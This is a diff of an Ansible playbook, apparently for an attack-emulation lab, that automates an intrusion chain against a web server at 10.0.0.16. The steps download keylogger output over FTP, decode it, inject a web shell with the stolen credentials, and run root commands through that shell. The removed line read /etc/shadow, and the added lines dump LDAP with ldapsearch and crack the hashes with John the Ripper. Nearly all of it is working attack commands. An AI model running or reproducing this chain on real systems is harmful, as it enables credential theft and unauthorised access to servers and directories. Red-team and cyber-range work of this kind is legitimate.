@@ -34,11 +34,22 @@
       raw: wget --user=anonymous --password='contractor@fazio.com' ftp://ftp.fazio.com:21/upload/logs.txt
     - name: decode keylogger file
       raw: python decoder.py
-- name: implement shell injection to webserver
+- name: implement shell injection to web server
   hosts: blackhat
   tasks:
     - name: log in web server using decoded username and password, inject web with shell file
       raw: php shellinject.php logs_decoded.txt 10.0.0.16/ shell.php
-
+- name: query credentials from LDAP using the shell on web server
+  hosts: blackhat
+  tasks:
     - name: run shell as root on web and get credentials
-      raw: php shellrun.php logs_decoded.txt 10.0.0.16/ 'sudo+cat+%2Fetc%2Fshadow'
+      raw: php shellrun.php logs_decoded.txt 10.0.0.16/ 'sudo+ldapsearch+-x+-b+%27dc%3Dfazio%2Cdc%3Dcom%27+%27%28objectclass%3D*%29%27+>+ldap_passwd'
+- name: crack the password from LDAP
+  hosts: blackhat
+  tasks:
+    - name: crack the password from LDAP in ldap_passwd
+      raw: john --wordlist=~/password ~/ldap_passwd
+    - name: show cracked result
+      raw: john --show ~/ldap_passwd
+    - name: store cracked result in cracked_ldap_passwd
+      raw: sudo cat /home/ubuntu/.john/john.pot > ~/cracked_ldap_passwd
